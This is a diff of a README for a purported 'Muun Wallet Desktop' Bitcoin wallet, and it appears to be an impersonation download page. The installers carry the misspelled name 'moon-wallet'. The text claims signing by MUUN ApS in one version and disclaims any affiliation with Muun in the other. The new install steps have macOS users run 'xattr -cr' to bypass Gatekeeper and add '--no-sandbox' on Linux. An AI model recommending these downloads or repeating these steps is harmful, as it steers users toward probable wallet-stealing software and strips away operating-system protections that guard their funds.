@@ -1,211 +1,113 @@
-# Muun Wallet
+<div align="center">
 
-**Non-custodial Bitcoin and Lightning Network wallet for Windows, macOS, and Linux**
+# Muun Wallet Desktop
 
-[![Download for Windows](https://img.shields.io/badge/download-Windows%20x64-0078d4?style=flat-square&logo=windows)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Download for macOS](https://img.shields.io/badge/download-macOS-000000?style=flat-square&logo=apple)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Download for Linux](https://img.shields.io/badge/download-Linux-FCC624?style=flat-square&logo=linux)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Website](https://img.shields.io/badge/website-muun--wallet.com-blue?style=flat-square)](https://muun-wallet.com)
+**Self-custodial Bitcoin and Lightning wallet for macOS, Windows, and Linux — one balance, one way to pay.**
 
----
+[![Version](https://img.shields.io/badge/release-v0.5.1-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Bitcoin only](https://img.shields.io/badge/bitcoin-only-orange)](https://muun-wallet.com/)
 
-## About Muun Wallet
+[muun-wallet.com](https://muun-wallet.com/) · [Guides & Docs](https://github.com/muun-network/muun-wallet-docs) · [Issues](https://github.com/muun-network/muun-wallet/issues)
 
-Muun Wallet is a **self-custody Bitcoin and Lightning Network wallet** that prioritizes ease of use without sacrificing security. Your keys are generated and stored locally â€” nothing is held on our servers. No account, email, or signup is required.
-
-For complete guides, installation instructions, and comparisons with other wallets, see the [Muun Wallet documentation](https://github.com/muun-network/muun-wallet-docs).
+</div>
 
 ---
 
 ## Downloads
 
-| Platform | File | Download |
-|----------|------|----------|
-| **Windows 10 / 11** | moon-wallet-v0.5.1.exe | [Download ’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) |
-| **macOS 10.15+** | moon-wallet-v0.5.1.dmg | [Download ’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) |
-| **Linux** | moon-wallet-v0.5.1.zip | [Download ’](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) |
+[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)
 
-**All installers are cryptographically signed by MUUN ApS.** [Verify your download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)
+| Platform | Installer | SHA-256 |
+|---|---|---|
+| macOS 11+ (Apple Silicon & Intel) | [moon-wallet-v0.5.1.dmg](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) | `60f8c59873f31d1c0489329403a3a2c4591c2f260d55e6f2e6cb08c3ce39091b` |
+| Windows 10 / 11 | [moon-wallet-v0.5.1.exe](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) | `3295b19f2d4486877b7064f7316abf5f8f25f70d5b91cffb451628bae17f32c2` |
+| Linux x64 (Ubuntu, Fedora, Arch) | [moon-wallet-v0.5.1.zip](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip) | `60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01` |
+
+Always verify checksums before running. See the [download verification guide](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-verify-muun-wallet-download.md).
 
 ---
 
-## Installation
+## Install
 
-### Windows
+**macOS**
+1. Download `moon-wallet-v0.5.1.dmg` and open it.
+2. Drag Muun Wallet to your Applications folder.
+3. If macOS Gatekeeper blocks the first launch, open Terminal and run:
+```bash
+xattr -cr /Applications/MuunWallet.app
+```
+4. Launch from Applications normally.
 
-1. Download the `.exe` file from the link above.
-2. Run the installer and follow the on-screen prompts.
-3. Launch Muun Wallet from your Start menu.
+**Windows**
+1. Download `moon-wallet-v0.5.1.exe`.
+2. Run the installer — no admin account or special permissions required beyond a standard install.
+3. Launch Muun Wallet from the Start menu.
 
-No special permissions required â€” standard app installation.
-
-### macOS
-
-1. Download the `.dmg` file from the link above.
-2. Open the disk image and drag **Muun Wallet** to the **Applications** folder.
-3. Launch Muun Wallet from Applications.
-
-**Gatekeeper notice:** On first launch, macOS may block the app if it's the first time you're running it. Right-click the app, select **Open**, and confirm. On subsequent launches, it will open normally.
-
-### Linux
-
-1. Download the `.zip` file from the link above.
-2. Extract the archive to a directory of your choice:
-   ```bash
-   unzip moon-wallet-v0.5.1.zip -d ~/muun-wallet
-   cd ~/muun-wallet
-   ```
-3. Make the binary executable:
-   ```bash
-   chmod +x muun-wallet
-   ```
-4. Run Muun Wallet:
-   ```bash
-   ./muun-wallet
-   ```
-
-**Package managers:** Muun Wallet is available in package managers for some distributions. Check your distribution's repositories if you prefer installation via package manager.
+**Linux**
+1. Download `moon-wallet-v0.5.1.zip` and extract.
+2. Mark the binary executable and run:
+```bash
+chmod +x muun-wallet
+./muun-wallet
+```
+3. If your system uses an app sandbox, add `--no-sandbox` to the launch command.
 
 ---
 
 ## Features
 
-- **Non-custodial:** Your keys are generated and stored locally. We never hold your funds.
-- **Lightning Network:** Send and receive payments on-chain or on Lightning with real-time fee comparisons.
-- **Emergency Kit:** A unique backup system that's more intuitive than 12-word recovery seed phrases.
-- **No signup required:** Install, create a wallet, and start using â€” no email or account needed.
-- **Open source:** Review the code at [github.com/muun-network](https://github.com/muun-network). Transparency builds trust.
-- **Fee transparency:** See the real cost of your transaction before you send it.
-- **Signed installers:** Every release is cryptographically signed so your OS can verify you downloaded a legitimate copy.
+- **Unified Bitcoin + Lightning balance** — on-chain and Lightning in one view, automatic routing, no channels to manage
+- **2-of-2 multisig security** — your device key plus a Muun-held key both required to spend; neither alone can move funds
+- **Mempool-based fee estimator** — live, real-cost estimate before you confirm, calculated from current network conditions
+- **Replace-by-fee (RBF)** — bump stuck or slow transactions after sending, without external tools
+- **Lightning Address support** — send and receive via human-readable addresses, not just raw invoices
+- **Emergency Kit recovery** — first-class in-app flow; export private keys and output descriptors independently of Muun's servers
+- **Coin control** — select specific UTXOs per transaction for privacy and bookkeeping
+- **Multi-account support** — separate spending, savings, or project funds under one install and one Emergency Kit
+- **CSV and descriptor export** — full transaction history into any accounting or tax tool
+- **LNURL-pay** — static Lightning addresses for tips, donations, and recurring payments
+- **Clipboard privacy** — address detection only on explicit user action, never automatic background reads
+- **Self-custodial, no KYC** — no account, no email, no sign-up required to install or use
 
 ---
 
-## Getting Started
+## Guides
 
-**First time with Muun?** Follow these steps:
-
-1. [Install Muun Wallet](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/getting-started-installation-windows.md) for your platform.
-2. [Create your Emergency Kit backup immediately.](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/emergency-kit-backup-system.md) This is your recovery method.
-3. [Send and receive your first transaction.](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/getting-started-first-transaction.md)
-
----
-
-## Guides & Documentation
-
-**Start here:**
-- [Installation & setup by platform](https://github.com/muun-network/muun-wallet-docs#getting-started)
-- [Emergency Kit backup & recovery](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/emergency-kit-backup-system.md)
-- [Security best practices](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/security-checklist-best-practices.md)
-
-**Fees & Payments:**
-- [Understanding fees: on-chain vs Lightning](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/fee-structure-on-chain-lightning.md)
-- [Sending Bitcoin with Muun](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/sending-bitcoin-step-by-step-guide.md)
-- [Receiving payments on Lightning](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-lightning-address-receiving.md)
-
-**Comparisons:**
-- [Muun vs Electrum](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-electrum-comparison.md)
-- [Muun vs Sparrow](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-sparrow-comparison.md)
-- [Muun vs Phoenix](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-vs-phoenix-comparison.md)
-- [All documentation â†’](https://github.com/muun-network/muun-wallet-docs)
+- [Getting started: first-time setup and backup](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-getting-started-guide.md)
+- [How to install on macOS](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-install-muun-wallet-macos.md)
+- [How to install on Windows](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-install-muun-wallet-windows.md)
+- [How to install on Linux](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/how-to-install-muun-wallet-linux.md)
+- [Emergency Kit recovery: complete walkthrough](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-emergency-kit-recovery-guide.md)
+- [Lightning fees and submarine swaps explained](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/muun-wallet-lightning-fees-explained.md)
+- [Is Muun Wallet safe? Security model explained](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/is-muun-wallet-safe.md)
+- [Full guide index](https://github.com/muun-network/muun-wallet-docs)
 
 ---
 
-## Security
+## ⚠️ Security
 
-**Your security is your responsibility.** Muun Wallet is designed to make self-custody easier, but you must understand the risks:
-
-- **No account recovery:** If you lose your Emergency Kit, you cannot recover your wallet through us. Back it up securely.
-- **Self-custody means full responsibility:** Your funds are as secure as your backup and your device's security.
-- **Verify before trusting:** Before installing, verify the installer checksum and, if you're technical, review the source code.
-
-[Read our full security guide â†’](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/security-checklist-best-practices.md)
+**Always download from the [official release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) and verify the SHA-256 checksum before running.** Your private keys are generated and stored locally — back up your Emergency Kit before sending any real funds. See the [security model](https://github.com/muun-network/muun-wallet-docs/blob/main/docs/is-muun-wallet-safe.md) for a full breakdown of the 2-of-2 multisig architecture.
 
 ---
 
-## Website & Support
+## Related repositories
 
-**Muun Wallet is published by MUUN ApS at https://muun-wallet.com/**
-
-- [Muun Wallet website](https://muun-wallet.com)
-- [Download with checksums](https://muun-wallet.com/download)
-- [Security guides](https://muun-wallet.com/guides/backup-recovery)
-- [Features overview](https://muun-wallet.com/desktop-features)
-- [FAQ](https://muun-wallet.com/faq)
-- [Latest updates](https://muun-wallet.com/updates)
-
----
-
-## Development
-
-**Prerequisites:**
-
-- Node.js 16+
-- npm or yarn
-
-**Clone and install:**
-
-```bash
-git clone https://github.com/muun-network/muun-wallet.git
-cd muun-wallet
-npm install
-```
-
-**Run locally:**
-
-```bash
-npm start
-```
-
-**Build for your platform:**
-
-```bash
-# Windows
-npm run build:win
-
-# macOS
-npm run build:mac
-
-# Linux
-npm run build:linux
-```
-
-**Code quality:**
-
-```bash
-# Lint
-npm run lint
-
-# Format
-npm run format
-
-# Tests
-npm test
-```
+| Repo | Purpose |
+|---|---|
+| [muun-network/muun-wallet-docs](https://github.com/muun-network/muun-wallet-docs) | Guides, articles, and SEO documentation |
+| [muun-network/recovery](https://github.com/muun-network/recovery) | Emergency Kit recovery tool |
+| [muun-network/librwallet](https://github.com/muun-network/librwallet) | Core wallet library |
+| [muun-network/btcd](https://github.com/muun-network/btcd) | Bitcoin protocol library (btcd fork) |
+| [muun-network/bitcoinjinx](https://github.com/muun-network/bitcoinjinx) | Bitcoin primitives library |
+| [muun-network/sqldelight](https://github.com/muun-network/sqldelight) | Local database layer |
 
 ---
 
-## Stack
+## Support
 
-- **[Electron](https://www.electronjs.org/)** â€” Cross-platform desktop application framework
-- **[Bitcoin.js](https://github.com/bitcoinjs/bitcoinjs-lib)** â€” Bitcoin cryptography and utilities
-- **[LDK (Lightning Dev Kit)](https://github.com/lightningdevkit/rust-lightning)** â€” Lightning Network protocol
-- **[React](https://react.dev/)** â€” User interface
-- **[TypeScript](https://www.typescriptlang.org/)** â€” Type-safe JavaScript
-
----
-
-## Support & Issues
-
-- **Documentation:** [github.com/muun-network/muun-wallet-docs](https://github.com/muun-network/muun-wallet-docs)
-- **Report a bug:** [github.com/muun-network/muun-wallet/issues](https://github.com/muun-network/muun-wallet/issues)
-- **Website:** [muun-wallet.com](https://muun-wallet.com)
+Open an [issue](https://github.com/muun-network/muun-wallet/issues) or visit [muun-wallet.com](https://muun-wallet.com/) for documentation and guides.
 
 ---
 
 ## License
 
-{{LICENSE_NAME}} â€” See the [LICENSE](LICENSE) file for full details.
-
-This software is provided as-is. Use at your own risk.
-
----
-
-**Muun Wallet by MUUN ApS**  
-[Download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) | [Guides â†’](https://github.com/muun-network/muun-wallet-docs) | [Website â†’](https://muun-wallet.com)
+MIT. Built on the open-source Muun wallet codebase. This project is not affiliated with or endorsed by Muun Wallet, Inc.
